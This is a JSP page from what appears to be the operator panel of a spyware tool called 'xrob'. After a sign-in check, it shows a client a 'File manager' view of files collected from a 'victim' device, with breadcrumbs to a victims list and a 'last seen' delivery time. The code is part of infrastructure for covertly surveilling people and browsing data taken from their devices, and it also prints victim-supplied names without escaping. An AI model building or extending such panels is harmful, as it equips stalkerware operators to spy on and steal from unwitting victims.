<%@ page import="com.theah64.xrob.api.models.Delivery" %>
<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%@ page import="com.theah64.xrob.api.database.tables.*" %>
<%@ page import="com.theah64.xrob.api.models.File" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Files</title>
    <%@include file="../../common_headers.jsp" %>
    <%
        final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tFiles", "file_row");
    %>
    <script>
        $(document).ready(function () {
            <%=searchTemplate.getSearchScript()%>
        });


    </script>
</head>
<body>
<div class="container">

    <%@include file="../header.jsp" %>

    <%
        try {

            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 2);
            final String victimCode = pathInfoUtils.getPart(1);
            String fileParentId = pathInfoUtils.getPart(2, "0");

            final Victims victimsTable = Victims.getInstance();
            final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

            if (theVictim != null) {

                if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {

                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(theVictim.getId());

    %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li><a href="/client/panel">Victims</a></li>
            <li><a href="/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
            </a></li>
            <li class="active">File manager</li>
        </ul>
    </div>

    <div class="row">

        <div class="row" style="margin-top: 20px;">

            <%
                final List<File> files = Files.getInstance().getAll(theVictim.getId(), fileParentId);
                if (files != null) {
            %>
            <div class="col-md-10 content-centered">

                <%=searchTemplate.getTopTemplate(
                        theVictim.getIdentity(),
                        lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>

                <table id="tDeliveries" class="table table-bordered table-condensed">
                    <tr>
                        <th>File name</th>
                        <th>Size</th>
                    </tr>

                    <%
                        for (final File file : files) {
                    %>
                    <tr class="delivery_row">
                        <td><%=file.getFileName()%>
                        </td>
                        <td><%=file.getFileSizeInKB()%>
                        </td>
                    </tr>
                    <%
                        }
                    %>

                </table>
            </div>
            <%
                } else {
                    throw new PathInfo.PathInfoException("No files found!");
                }
            %>

        </div>

        <%

            } else {

                throw new PathInfo.PathInfoException("No connection established with this victim");
            }

        %>
    </div>
    <%
        } else {
            throw new PathInfo.PathInfoException("Invalid victim code");
        }
    } catch (PathInfo.PathInfoException e) {
        e.printStackTrace();
    %>
    <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
    <%
        }
    %>

</div>
</body>
</html>
